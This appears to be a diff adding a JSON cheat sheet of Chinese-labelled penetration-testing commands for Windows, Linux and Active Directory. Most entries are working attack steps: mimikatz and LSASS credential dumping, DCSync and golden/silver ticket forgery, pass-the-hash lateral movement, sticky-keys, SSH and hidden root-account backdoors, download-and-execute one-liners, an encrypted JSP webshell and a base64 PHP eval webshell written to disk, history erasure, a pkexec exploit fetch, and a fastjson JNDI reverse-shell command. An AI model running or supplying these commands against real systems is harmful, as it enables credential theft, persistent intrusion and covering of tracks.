@@ -1,0 +1,346 @@
+[
+  {
+    "name": "Win-凭证获取",
+    "command": "🚀 mimikatz抓取当前登录密码:\nmimikatz.exe \"log hash.txt\" \"privilege::debug\" \"sekurlsa::logonPasswords\" \"exit\"\n\n🚀 mimikatz抓取本机SAM Hash:\nmimikatz.exe \"log hash.txt\" \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"\n\n🚀 mimikatz抓取域用户Hash (需域管权限):\nmimikatz.exe \"log hash.txt\" \"lsadump::dcsync /domain:offensive.local /all /csv\" \"exit\"\nmimikatz.exe \"log hash.txt\" \"lsadump::dcsync /domain:offensive.local /user:Administrator\" \"exit\"\nmimikatz.exe \"log hash.txt\" \"lsadump::dcsync /domain:offensive.local /user:krbtgt\" \"exit\"\n\n🚀 procdump导出LSASS内存\nprocdump64.exe -accepteula -ma lsass.exe C:\\programdata\\lsass.dmp\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" \"exit\"\n\n🚀 comsvcs.dll导出LSASS内存 (需管理员权限)\nfor /f \"tokens=2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump %i C:\\programdata\\lsass.dmp full\n\n🚀 DumpMinitool.exe导出内存 (微软签名)\nfor /f \"tokens=2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do DumpMinitool.exe --file dump.dmp --processId %i --dumpType Full\n\n🚀 注册表离线导出Hash\nreg save HKLM\\SYSTEM system.hiv\nreg save HKLM\\SAM sam.hiv\nreg save HKLM\\security security.hiv\nsecretsdump.exe -sam sam.hiv -security security.hiv -system system.hiv LOCAL\nmimikatz.exe \"lsadump::sam /system:system.hiv /sam:sam.hiv\" \"exit\"\n\n🚀 域控导出ntds.dit (需域管权限)\nreg save HKLM\\SYSTEM system.hiv\n# 复制 ntds.dit 后离线解析:\nsecretsdump.exe -system system.hiv -ntds ntds.dit LOCAL\n# 或远程导出:\nsecretsdump.exe domain/administrator:Admin12345@192.168.1.10 -dc-ip 192.168.1.10\n\n🚀 卷影拷贝获取域控凭证 (Server 2003/2008/2012)\nntdsutil.exe snapshot \"activate instance ntds\" create quit quit\nntdsutil.exe snapshot \"mount {快照GUID}\" quit quit\ncopy \"C:\\$SNAP_xxx$\\Windows\\NTDS\\ntds.dit\" C:\\ntds.dit\nntdsutil.exe snapshot \"umount {快照GUID}\" \"delete {快照GUID}\" quit quit\n\n🚀 获取系统保存的RDP密码\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n# mimikatz解密 (需先dump lsass或debug权限):\nprivilege::debug\ndpapi::cred /in:{凭证文件}\nsekurlsa::dpapi\ndpapi::cred /in:{凭证文件} /masterkey:{MasterKey}\nts::logonpasswords\nexit\n\n🚀 获取系统保存的VPN/凭据\nmimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"\nrundll32 keymgr.dll,KRShowKeyMgr\n\n🚀 获取已连接WIFI密码\nnetsh wlan show profiles\nfor /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-权限维持",
+    "command": "🚀 粘滞键后门 (需物理/控制台访问):\npushd C:\\windows\\system32\nmove sethc.exe sethc.exe.bak\ncopy cmd.exe sethc.exe\n\n🚀 克隆账号\npowershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd\n\n🚀 伪造黄金票据 (伪造TGT)\n# 条件: 域管理员用户名、域名、域SID、krbtgt的NTLM Hash\nnet group \"domain admins\" /domain\nipconfig /all\nwmic useraccount get name,sid\nwhoami /user\nmimikatz.exe \"lsadump::dcsync /domain:offensive.local /user:krbtgt\" \"exit\"\nkerberos::purge\nkerberos::golden /admin:administrator /domain:offensive.local /sid:S-1-5-21-xxx /krbtgt:{NTLM_HASH} /ticket:golden.kirbi\nkerberos::ptt golden.kirbi\nkerberos::tgt\ndir \\\\dc\\c$\n\n🚀 伪造白银票据 (伪造TGS)\n# 条件: 域名、域SID、目标服务器FQDN、服务类型、服务账号NTLM Hash\n# 票据约20分钟有效, 不产生域控通信日志\nipconfig /all\nwmic useraccount get name,sid\nwhoami /user\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\nkerberos::purge\nkerberos::golden /user:administrator /id:500 /domain:offensive.local /sid:S-1-5-21-xxx /target:dc.offensive.local /rc4:{NTLM_HASH} /service:cifs /ptt\nkerberos::tgt\ndir \\\\dc\\c$\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-横向移动",
+    "command": "🚀 开启UAC后, 只有本地管理员组里的账户能PTH; 域Domain Admin默认在本地管理员组\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n\n🚀 mimikatz Pass-The-Hash\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:{NTLM_HASH} /run:cmd.exe\" \"exit\"\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:{NTLM_HASH} /run:mstsc.exe /restrictedadmin\" \"exit\"\n\n🚀 impacket psexec (445端口, 需admin$共享)\npsexec.exe domain/administrator:Admin12345@192.168.1.10 \"whoami /user\" -codec gbk\npsexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 \"whoami /user\" -codec gbk\n\n🚀 impacket wmiexec (135端口, 隐蔽性较好)\nwmiexec.exe domain/administrator:Admin12345@192.168.1.10 \"whoami /user\" -codec gbk\nwmiexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 \"whoami /user\" -codec gbk\n\n🚀 impacket smbexec\nsmbexec.exe domain/administrator:Admin12345@192.168.1.10 -codec gbk\nsmbexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 \"whoami /user\" -codec gbk\n\n🚀 impacket atexec (计划任务)\natexec.exe domain/administrator:Admin12345@192.168.1.10 \"whoami /user\" -codec gbk\n\n🚀 impacket dcomexec\ndcomexec.exe domain/administrator:Admin12345@192.168.1.10 -codec gbk\ndcomexec.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10 \"whoami /user\" -codec gbk\n\n🚀 impacket smbclient\nsmbclient.exe domain/administrator:Admin12345@192.168.1.10\nsmbclient.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10\n\n🚀 查看远程计算机进程\ntasklist /S 192.168.1.10 /U domain\\administrator /P P@ssw0rd /V\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-域渗透命令",
+    "command": "查看当前用户权限: whoami /user\n查看域工作站信息: net config workstation\n查询域用户: net user /domain\n查询域管理员: net group \"domain admins\" /domain\n查询域控制器: net group \"domain controllers\" /domain\n查询域内计算机: net group \"domain computers\" /domain\n查看域内计算机列表: net view /domain:offensive.local\n查看域信任: nltest /domain_trusts\n查看域密码策略: net accounts /domain\n查询域控制器时间: net time /domain\n通过SRV记录定位域控: nslookup -type=SRV _ldap._tcp.dc._msdcs.offensive.local\n添加域用户: net user ASP.NET Admin12345 /add /domain\n添加域管理员: net group \"domain admins\" ASP.NET /add /domain\n建立IPC会话: net use \\\\192.168.1.10\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\"\nimpacket查询域用户: GetADUsers.exe -all domain/administrator:Admin12345 -dc-ip 192.168.1.10\nimpacket查询域计算机: GetADComputers.exe domain/administrator:Admin12345 -dc-ip 192.168.1.10\nimpacket查询用户SID: lookupsid.exe -hashes :{NTLM_HASH} domain/administrator@192.168.1.10\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取操作系统信息",
+    "command": "查看系统版本和补丁信息: systeminfo\n识别操作系统名称及版本(英文): systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n识别操作系统名称及版本(中文): systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"\n识别系统体系结构: echo %PROCESSOR_ARCHITECTURE%\n查看补丁信息: wmic qfe get Caption,Description,HotFixID,InstalledOn\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取用户信息",
+    "command": "查看当前用户: whoami\n查看当前用户权限: whoami /priv\n查看当前用户组: whoami /groups\n查看计算机用户列表: net user\n查看计算机用户组列表: net localgroup\n查看管理组列表: net localgroup Administrators\n查看当前登录用户: query user\n查看当前用户保存的凭证: cmdkey /list\n查看当前用户保存的票据: klist\nWindows存储的凭证GUI: rundll32 keymgr.dll,KRShowKeyMgr\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取网络信息",
+    "command": "查看路由信息: route print\n查看ARP: arp -a\n查看IP和DNS: ipconfig /all\n查看防火墙规则: netsh advfirewall show allprofiles\n查看系统开放端口: netstat -ano\n查看网卡信息: netsh interface show interface\nWin设置终端代理: set http_proxy=http://127.0.0.1:7890 & set https_proxy=http://127.0.0.1:7890\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取应用程序及服务信息",
+    "command": "查看计划任务: schtasks /query /fo LIST /v\n查看安装驱动: driverquery\n查看安装程序: wmic product get name,version\n查看服务: wmic service list brief\n查看进程: tasklist /svc\n列出详细进程: tasklist /V /FO CSV\n根据进程查找路径: wmic process where name=\"chrome.exe\" get processid,executablepath,name\n查看启动程序: wmic startup list brief\n查看3389端口: for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq TermService\" /NH') do netstat -ano | findstr %i | findstr LISTENING\n查看AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n查看补丁信息: wmic qfe get Caption,Description,HotFixID,InstalledOn\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-获取敏感数据和目录",
+    "command": "搜索D盘logo.jpg: cd /d D:\\ && dir /b /s logo.jpg\n搜索C盘conf文件含password: findstr /s /i /n /d:C:\\ \"password\" *.conf\n查找敏感文件: dir /b/s password.txt & dir /b/s *.docx & dir /b/s config.*\nfindstr /si password *.xml *.ini *.txt\nfindstr /si login *.xml *.ini *.txt\n无人值守安装文件: C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml\n列出Users目录: dir /b c:\\Users\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-添加用户",
+    "command": "添加用户并设置密码: net user mstlab P@ssw0rd /add\n将用户加入管理组: net localgroup administrators mstlab /add\n将用户加入远程桌面组: net localgroup \"Remote Desktop Users\" mstlab /add\n激活guest用户: net user guest /active:yes\n更改guest密码: net user guest P@ssw0rd\n将guest加入管理组: net localgroup administrators guest /add\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-注册表相关",
+    "command": "查看3389端口: reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n开启远程桌面: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nwmic开启远程桌面: wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n注册表抓取明文(需重启或重新登录): reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\nRDP默认10条连接记录: reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\nRDP所有连接记录: reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s\n查找软件安装目录: reg query HKLM /f foxmail /t REG_SZ /s\nreg导出注册表Hash: reg save hklm\\sam c:\\programdata\\sam.hive & reg save hklm\\system c:\\programdata\\system.hive\nHash登录Restricted Admin: reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f\nmstsc /admin /v:192.168.1.10\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-mimikatz常用",
+    "command": "mimikatz抓取当前密码: mimikatz \"log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\nmimikatz PTH传递cmd: mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:{NTLM_HASH} /run:cmd.exe\" \"exit\"\nmimikatz抓取域Hash: mimikatz \"lsadump::dcsync /domain:offensive.local /all /csv\" \"exit\"\nreg导出Hash: reg save hklm\\sam c:\\programdata\\sam.hive & reg save hklm\\system c:\\programdata\\system.hive\nmimikatz读取离线Hash: mimikatz \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"\nsecretsdump离线: secretsdump.exe -sam sam.hive -system system.hive LOCAL\nPPL保护绕过: mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"sekurlsa::logonpasswords\"\n令牌操作: token::whoami / token::elevate / token::revert\nxfreerdp hash连接: xfreerdp /u:administrator /pth:{NTLM_HASH} /v:192.168.1.10 /cert-ignore\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-系统下载文件",
+    "command": "certutil下载: certutil -urlcache -split -f http://127.0.0.1:8080/nc.exe c:\\nc.exe\ncertutil删除记录: certutil -urlcache -split -f http://127.0.0.1:8080/nc.exe delete\nbitsadmin下载: bitsadmin /rawreturn /transfer getfile http://127.0.0.1/file.zip c:\\file.zip\npowershell下载: powershell -nop -exec bypass -c \"(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.exe','c:\\nc.exe')\"\ncertutil解码写文件: certutil -f -decode encoded.txt c:\\output.exe\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-Wmic命令",
+    "command": "wmic远程连接: wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"P@ssw0rd\"\n查看系统安装软件: wmic product get name,version\n查看系统版本: wmic OS get Caption,CSDVersion,OSArchitecture,Version\n根据PID查找进程路径: wmic process get name,executablepath,processid | findstr {pid}\n查看磁盘信息: wmic logicaldisk get caption,description,providername\n查看计算机信息: wmic computersystem get Name,Domain,Manufacturer,Model,Username /format:list\n查看是否VMware: wmic bios list full | find /i \"vmware\"\n查看屏保设置: wmic desktop get screensaversecure,screensavertimeout\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-Mssql环境",
+    "command": "开启xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n关闭xp_cmdshell:\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\nEXEC sp_configure 'show advanced options', 0; RECONFIGURE;\n\nmssql写文件(代替echo): exec master..xp_cmdshell '>>c:\\windows\\temp\\info.txt set /p=\"content\" <nul';\n\n查看web.config密码: exec master..xp_cmdshell 'findstr /c:\"User Id=\" /c:\"Password=\" /si c:\\inetpub\\wwwroot\\web.config';\n\n枚举MSSQL实例: PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\"\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-压缩解压",
+    "command": "7z压缩: 7z.exe a output.7z inputfile\n7z解压: 7z.exe x input.7z -ooutputdir\nRAR压缩: rar.exe a output.rar inputfile\nRAR解压: rar.exe x input.rar outputdir\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-查找文件",
+    "command": "dir c:\\ /s /b | find \"win.ini\"\ndir c:\\ /s /b | find \"navicat.exe\"\ndir c:\\ /s /b | find \"finalshell.exe\"\ncd /d C:\\ && dir /b /s password.txt\nwhere /R C:\\ password.txt\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-写文件",
+    "command": "echo ^<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%^> >> C:/x/x.jsp\n\necho ^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^> >> C:/x/x.jsp\n\necho ^<%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >> C:/x/x.jsp\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-显示曾连接的无线密码",
+    "command": "netsh wlan show profiles\nfor /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-常用系统变量",
+    "command": "%HOMEPATH% - 当前用户目录\n%CD% - 当前目录\n%Path% - 可执行文件搜索路径\n%PROCESSOR_ARCHITECTURE% - 处理器架构\n%ProgramFiles% - Program Files路径\n%TEMP% / %TMP% - 临时目录\n%USERDOMAIN% - 用户所在域名\n%WINDIR% - Windows目录\n%ALLUSERSPROFILE% - 所有用户配置文件位置\n%NUMBER_OF_PROCESSORS% - 处理器数目\n%PSModulePath% - PowerShell模块路径\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-网络Ping探测",
+    "command": "for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\"\nfor /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\">>c:\\alive.txt\nfor /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i \"ttl\"\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-探测是否出网",
+    "command": "certutil -urlcache -split -f http://test.example.com\npowershell Invoke-WebRequest \"http://test.example.com/\"\ncurl http://test.example.com\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-开启3389",
+    "command": "# 通用reg方式\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n# Win2008\nwmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1\nwmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n\n# impacket远程开启3389\nreg.exe domain/administrator:Admin12345@192.168.1.10 add -keyName \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" -v fDenyTSConnections -vt REG_DWORD -vd 0\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-查看历史命令",
+    "command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ntype %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ndoskey /history\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-计算文件hash",
+    "command": "certutil.exe -hashfile file.txt MD5\ncertutil.exe -hashfile file.txt SHA256\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-强制停止进程",
+    "command": "停止指定PID: taskkill /f /pid 3352\n停止指定进程名: taskkill /f /im explorer.exe\n停止进程树: taskkill /f /t /im msedge.exe\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Win-端口转发",
+    "command": "lcx本地监听: lcx.exe -listen 110 34567\nlcx目标执行: lcx.exe -slave vps_ip 110 127.0.0.1 3389\nmeterpreter端口转发: portfwd add -l 6666 -p 3389 -r 127.0.0.1\nnetsh端口转发: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1\n",
+    "meta": [
+      "windows"
+    ]
+  },
+  {
+    "name": "Linux-权限维持",
+    "command": "🚀 创建Root权限账户\nuseradd -p $(openssl passwd -1 -salt 'support' Passw0rd) -o -u 0 -g root -G root -s /bin/bash -d /home/support\n\n🚀 创建普通权限账户\nuseradd -p $(openssl passwd -1 -salt 'support' Passw0rd) support\nuseradd -m -s /bin/bash admin && echo \"admin:toor\" | chpasswd\n\n🚀 SSH密钥后门\nssh-keygen -t ed25519 -N \"\" -f ./id_ed25519\nmkdir -p ~/.ssh && cat ./id_ed25519.pub >> ~/.ssh/authorized_keys\nchmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys\n\n🚀 软链接SSH后门 (任意密码登录)\nln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=20020\nssh root@IP -p 20020\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-权限提升",
+    "command": "🚀 SUID提权查找:\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -print 2>/dev/null\n\n🚀 常见SUID提权程序: nmap vim find bash more less nano cp\n\n🚀 sudo提权查看:\nsudo -l\ncat /etc/sudoers\n\n🚀 CVE-2021-4034 (pkexec)\nwget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run\nchmod +x /tmp/.ICE-unix/run && /tmp/.ICE-unix/run\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看操作系统版本",
+    "command": "cat /etc/issue\ncat /etc/*-release\ncat /etc/os-release\ncat /etc/lsb-release\ncat /etc/redhat-release\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看内核版本",
+    "command": "cat /proc/version\nuname -a\nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep vmlinuz-\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看环境变量",
+    "command": "cat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\nenv\nset\nlpstat -a\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取应用程序及服务信息",
+    "command": "查看运行进程:\nps aux\nps -ef\ntop\nps aux | grep root\n\n查看安装应用:\ndpkg -l\nrpm -qa\nls -alh /usr/bin/\nls -alh /sbin/\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取服务及配置文件",
+    "command": "cat /etc/apache2/apache2.conf\ncat /etc/httpd/conf/httpd.conf\ncat /etc/my.cnf\ncat /etc/nginx/nginx.conf\ncat /etc/syslog.conf\ncat /etc/ssh/sshd_config\nls -aRI /etc/ | awk '$1 ~ /^.*r.*/'\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取计划任务信息",
+    "command": "crontab -l\ncat /etc/crontab\nls -al /etc/cron*\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /var/spool/cron/crontabs/root\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取用户信息",
+    "command": "id\nwho\nw\nlast\nlastlog\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\ngrep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 {print $1}'\nsudo -l\nls -ahlR /root/\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查找配置文件中的密码",
+    "command": "grep -ri password /etc/\ngrep -ri pass /var/www/\nfind / -name \"*.properties\" 2>/dev/null | xargs grep -i password\ncat /var/lib/mysql/mysql/user.MYD\ncat /root/anaconda-ks.cfg\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看其他用户的操作记录",
+    "command": "cat ~/.bash_history\ncat ~/.mysql_history\ncat ~/.nano_history\ncat `cat /etc/passwd | grep /bin/bash | awk -F \":\" '{print $6}' | sed 's/$/\\/.bash_history/g'`\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看ssh私钥",
+    "command": "cat ~/.ssh/id_rsa\ncat ~/.ssh/id_ed25519\ncat ~/.ssh/authorized_keys\ncat /etc/ssh/sshd_config\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-获取网络信息",
+    "command": "查看IP:\nifconfig -a\nip a\nhostname -I\n\n查看网络配置:\ncat /etc/resolv.conf\ncat /etc/hosts\niptables -L\n\n查看端口:\nnetstat -tulnp\nss -tulnp\nlsof -i :80\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-其他常用命令",
+    "command": "设置终端代理:\nexport https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n\n交互式shell:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n搜索文件:\nfind / -name pass.txt 2>/dev/null\nfind / -name *.properties | xargs grep password\n\nbase64写webshell(绕过关键字):\necho -n \"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+\" | base64 -d > logo.php\n\n添加hosts:\necho \"192.168.1.10 dc.offensive.local offensive.local dc\" >> /etc/hosts\n\n当前会话不记录history:\nunset HISTFILE; export HISTFILE=/dev/null; export HISTSIZE=0\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-端口转发",
+    "command": "LCX:\nlcx -listen 4567 3389\nlcx -slave attacker_ip 4567 127.0.0.1 3389\n\nSSH本地转发:\nssh -L 8080:127.0.0.1:80 user@192.168.1.7\n\nSSH远程转发:\nssh -R 8080:127.0.0.1:80 user@192.168.1.7\n\nSSH动态代理:\nssh -D 127.0.0.1:9050 -N user@192.168.1.7\nproxychains curl http://127.0.0.1\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查找文件",
+    "command": "find / -name passwd 2>/dev/null\nfind / -name \"*.conf\" 2>/dev/null\nfind / -name logo.jpg 2>/dev/null\nfind /home -type f -name \"*.sql\" 2>/dev/null\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-写文件",
+    "command": "echo xxxxx== | base64 -d > /var/www/html/1.jsp\necho \"content\" > /tmp/file.txt\necho \"content\" >> /tmp/file.txt\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-网络Ping探测",
+    "command": "for i in 192.168.0.{1..254}; do ping -c 1 -W 1 $i &>/dev/null && echo $i is alive; done\nfor i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo 192.168.1.$i; done\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看SSH登录记录",
+    "command": "CentOS/RHEL: grep 'Accepted' /var/log/secure\nUbuntu/Debian: grep 'Accepted' /var/log/auth.log\nlast\nlastlog\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看ssh端口",
+    "command": "netstat -tulnp | grep sshd\nss -tulnp | grep sshd\ngrep -i \"^Port\" /etc/ssh/sshd_config\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "Linux-查看系统资源",
+    "command": "free -h\ndf -h\nlscpu\nuptime\n",
+    "meta": [
+      "linux"
+    ]
+  },
+  {
+    "name": "fastjson执行命令",
+    "command": "java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,BASE64_CMD}|{base64,-d}|{bash,-i}\" -A \"x.x.x.x\"\n",
+    "meta": [
+      "windows",
+      "linux"
+    ]
+  }
+]
